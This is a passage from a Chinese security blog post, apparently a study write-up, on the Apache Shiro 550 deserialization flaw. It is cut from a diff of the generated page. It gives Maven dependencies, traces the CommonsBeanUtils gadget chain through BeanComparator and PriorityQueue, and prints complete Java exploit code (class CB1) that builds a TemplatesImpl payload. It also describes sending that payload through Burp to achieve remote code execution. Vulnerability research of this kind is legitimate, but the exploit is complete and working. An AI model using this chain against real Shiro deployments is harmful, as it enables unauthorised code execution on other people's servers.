class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>上面说了CB的用处，比如一个类<code>Person</code>是个<code>JavaBean</code>，它有个<code>name</code>属性，则<code>PropertyUtils.getProperty(new Person(),&quot;name&quot;)</code>则会调用它的<code>getName()</code>方法，那么之前写的CC3里的Templateslmpl的getOutputProperties也是get开头的</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213200255600.png" alt="image-20241213200255600"></p>
+<p>我们把CC3的代码粘过来，成功执行了命令,这样就成功找到了反序列化的尾部</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213200151611.png" alt="image-20241213200151611"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="comment">// 反射修改templates的值</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">    <span class="comment">// 修改_name</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">NameFIeld</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    NameFIeld.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    NameFIeld.set(templates, <span class="string">&quot;test&quot;</span>); <span class="comment">// 赋值</span></span><br><span class="line">    <span class="comment">// 修改_bytecodes</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">BytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    BytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://temp/classes/Test.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">    BytecodesField.set(templates,codes);</span><br><span class="line">    <span class="comment">// 修改tfactory</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tFactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tFactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tFactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="type">PropertyUtilsBean</span> <span class="variable">propertyUtilsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyUtilsBean</span>();</span><br><span class="line">    propertyUtilsBean.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>说白了<strong>getProperty</strong>的属性值可以控制的话，就可以任意执行代码，所以还是找反序列化的那个思路，看看哪里调了getProperty</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213205743716.png" alt="image-20241213205743716"></p>
+<p>这样就找到了位于BeanComparator类的compare方法，而且property这个属性还是可以控制的，o1是我们传的参数。</p>
+<p>继续找谁调用了 compare() 方法，这里就太多了，我们优先去找能够进行序列化的类，于是这里找到了 <code>PriorityQueue</code> 这个类。PriorityQueue<code>这个类的</code>siftDownUsingComparator()<code>方法调用了</code>compare()，继续找谁调用了 <code>siftDownUsingComparator()</code> 方法，发现在同一个类中的 <code>siftDown()</code> 方法调用了它。同样，发现同个类下的 <code>heapify()</code> 方法调用了 <code>siftDown()</code> 方法</p>
+<p>,最后在寻找谁调用<strong>heapify</strong>时候，找到了readobejct</p>
+<h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CB1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// 反射修改templates的值</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// 修改_name</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">NameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        NameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        NameField.set(templates, <span class="string">&quot;test&quot;</span>); <span class="comment">// 赋值</span></span><br><span class="line">        <span class="comment">// 修改_bytecodes</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">BytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        BytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://temp/classes/Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        BytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        PriorityQueue&lt;Object&gt; priorityQueue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 反射将 property 的值赋为 outputProperties 让他不要在序列化的时候就执行</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">pc</span> <span class="operator">=</span> priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparatorField</span> <span class="operator">=</span> pc.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparatorField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparatorField.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="comment">//serialize(priorityQueue);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="comment">//unserialize(&quot;ser.bin&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反序列化</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="CB1打Shiro550"><a href="#CB1打Shiro550" class="headerlink" title="CB1打Shiro550"></a>CB1打Shiro550</h1><p>用上面我们写的EXP生成的payload去生成,放到burp里，一样的删除掉JSESSIONID，然后就成功执行了命令，造成了RCE</p>
+<p><img src="/2024/12/13/Shiro550%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/image-20241213214422589.png" alt="image-20241213214422589"></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=333.788.videopod.sections&vd_source=7ee5bc742ad8e76b4536e01b16e6839d">https://www.bilibili.com/video/BV1iF411b7bD?spm_id_from=333.788.videopod.sections&amp;vd_source=7ee5bc742ad8e76b4536e01b16e6839d<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#1-%E5%B0%BE%E9%83%A8%E9%93%BE%E5%AD%90-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-%E5%88%A9%E7%94%A8-TemplatesImpl-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#1-%E5%B0%BE%E9%83%A8%E9%93%BE%E5%AD%90-%E2%80%94%E2%80%94%E2%80%94%E2%80%94-%E5%88%A9%E7%94%A8-TemplatesImpl-%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2024/12/14/HTB-LinkVortex-WriteUp/"
+                                   title="[HTB]LinkVortex WriteUp"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">[HTB]LinkVortex WriteUp</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/12/09/%E5%8D%8A%E9%80%94%E8%80%8C%E5%BA%9F%E7%9A%84jfinal-cms%E5%AE%A1%E8%AE%A1/"
+                                   title="半途而废的jfinal_cms审计"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">半途而废的jfinal_cms审计</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="twikoo-container">
+        <div id="twikoo-comment"></div>
+        <script 
+                src="//cdn.jsdelivr.net/npm/twikoo@1.6.39/dist/twikoo.all.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initTwikoo = () => {
+            if (window?.twikoo) {
+              twikoo.init({
+                el: '#twikoo-comment',
+                envId: 'https://rpsec.netlify.app/.netlify/functions/twikoo',
+                region: '',
+                lang: 'zh-CN' || 'zh-CN'
+              })
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initTwikoo()
+              }, 1000)
+            }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initTwikoo()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initTwikoo)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-Clone-IDEA"><span class="nav-text">Tomcat&amp;&amp;Clone&amp;&amp;IDEA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%93%E5%8C%85"><span class="nav-text">抓包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%9F%E8%BF%9B%E6%BA%90%E7%A0%81"><span class="nav-text">跟进源码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E8%A7%A3%E5%86%B3%EF%BC%9A"><span class="nav-text">踩坑解决：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86"><span class="nav-text">解密</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%EF%BC%88URLDNS%E9%93%BE%EF%BC%89"><span class="nav-text">验证（URLDNS链）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CB1%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">CB1链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CB%E7%AE%80%E4%BB%8B"><span class="nav-text">CB简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJavaBean"><span class="nav-text">什么是JavaBean</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Maven"><span class="nav-text">Maven</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP%E7%BC%96%E5%86%99"><span class="nav-text">EXP编写</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CB1%E6%89%93Shiro550"><span class="nav-text">CB1打Shiro550</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2024
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">redpomelo</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">14.4k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-Clone-IDEA"><span class="nav-text">Tomcat&amp;&amp;Clone&amp;&amp;IDEA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8A%93%E5%8C%85"><span class="nav-text">抓包</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B7%9F%E8%BF%9B%E6%BA%90%E7%A0%81"><span class="nav-text">跟进源码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B8%A9%E5%9D%91%E8%A7%A3%E5%86%B3%EF%BC%9A"><span class="nav-text">踩坑解决：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86"><span class="nav-text">解密</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%AA%8C%E8%AF%81%EF%BC%88URLDNS%E9%93%BE%EF%BC%89"><span class="nav-text">验证（URLDNS链）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CB1%E9%93%BE%E5%88%86%E6%9E%90"><span class="nav-text">CB1链分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#CB%E7%AE%80%E4%BB%8B"><span class="nav-text">CB简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFJavaBean"><span class="nav-text">什么是JavaBean</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Maven"><span class="nav-text">Maven</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EXP%E7%BC%96%E5%86%99"><span class="nav-text">EXP编写</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CB1%E6%89%93Shiro550"><span class="nav-text">CB1打Shiro550</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
